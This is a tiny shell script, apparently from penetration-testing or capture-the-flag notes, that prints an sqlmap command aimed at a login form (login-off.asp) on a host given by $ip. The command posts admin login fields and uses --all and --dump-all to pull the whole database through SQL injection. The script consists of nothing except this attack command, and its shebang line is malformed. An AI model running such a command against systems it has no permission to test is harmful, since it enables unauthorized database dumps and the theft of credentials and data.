#/bin/bash
echo "sqlmap -u 'http://$ip/login-off.asp' --method POST  --data 'txtLoginID=admin&txtPassword=aa&cmdSubmit=Login' --all --dump-all"